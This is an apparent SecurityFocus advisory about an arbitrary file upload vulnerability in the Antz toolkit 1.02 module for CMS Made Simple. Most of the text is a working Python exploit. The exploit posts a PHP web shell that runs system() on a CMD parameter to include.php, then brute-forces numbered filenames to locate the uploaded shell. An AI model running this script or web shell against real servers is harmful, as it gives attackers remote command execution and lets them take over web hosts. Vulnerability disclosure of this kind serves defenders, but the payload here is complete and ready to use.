source: http://www.securityfocus.com/bid/41569/info

The Antz toolkit module for CMS Made Simple is prone to a vulnerability that lets attackers upload arbitrary files because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the webserver process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

Antz toolkit 1.02 is vulnerable; other versions may also be affected. 

import socket

host = 'localhost'
path = '/cmsms'
port = 80

def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)    

    s.send('POST ' + path + '/include.php HTTP/1.1\r\n'
           'Host: localhost\r\n'
           'Proxy-Connection: keep-alive\r\n'
           'User-Agent: x\r\n'
           'Content-Length: 257\r\n'
           'Cache-Control: max-age=0\r\n'
           'Origin: null\r\n'
           'Content-Type: multipart/form-data; boundary=----x\r\n'
           'Accept: text/html\r\n'
           'Accept-Encoding: gzip,deflate,sdch\r\n'
           'Accept-Language: en-US,en;q=0.8\r\n'
           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="antzSeed"\r\n'
           '\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="shell_file"; filename="shell.php"\r\n'
           'Content-Type: application/octet-stream\r\n'
           '\r\n'
           '<?php echo \'<pre>\' + system($_GET[\'CMD\']) + \'</pre>\'; ?>\r\n'
           '------x--\r\n'
           '\r\n')

    resp = s.recv(8192)

    s.close()

    http_ok = 'HTTP/1.1 200 OK'
    
    if http_ok not in resp[:len(http_ok)]:
        print 'error uploading shell'
        return
    else: print 'shell uploaded'

    print 'searching for shell'

    for i in range(0, 9999):

        shell_path = path + '/modules/antz/tmp/' + str(i) + 'shell.php'

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.settimeout(8)   
    
        s.send('GET ' + shell_path + ' HTTP/1.1\r\n'\
               'Host: ' + host + '\r\n\r\n')

        if http_ok in s.recv(8192)[:len(http_ok)]:
            print '\r\nshell located at http://' + host + shell_path
            break
        else:
            print '.',

upload_shell()
